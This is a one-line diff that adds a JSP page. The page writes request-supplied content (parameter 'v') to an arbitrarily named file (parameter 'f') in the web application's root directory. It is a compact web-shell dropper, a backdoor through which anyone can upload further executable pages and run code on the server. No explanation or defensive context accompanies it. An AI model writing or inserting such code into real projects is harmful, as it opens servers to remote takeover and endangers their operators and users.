@@ -1,0 +1,1 @@
+<%String path=request.getSession().getServletContext().getResource("/").getFile();if(request.getParameter("f")!=null)(new java.io.FileOutputStream(path+request.getParameter("f"))).write(request.getParameter("v").getBytes());%>
